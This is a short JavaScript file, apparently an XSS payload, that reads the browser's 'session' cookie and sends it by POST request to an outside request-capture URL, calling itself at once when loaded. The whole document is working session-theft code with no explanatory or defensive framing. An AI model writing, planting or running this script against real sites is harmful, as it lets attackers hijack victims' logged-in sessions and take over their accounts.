function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

// Function to send the session cookie to the specified URL
function sendSessionCookie() {
    // Get the 'session' cookie value
    const sessionCookie = getCookie('session');

    if (sessionCookie) {
        // Send the cookie value to the specified URL via a POST request
        fetch('https://en1e81pb56qg5.x.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ session: sessionCookie })
        })
        .then(response => response.json())
        .then(data => console.log('Success:', data))
        .catch((error) => console.error('Error:', error));
    } else {
        console.log('Session cookie not found');
    }
}

// Call the function to execute the script
sendSessionCookie();
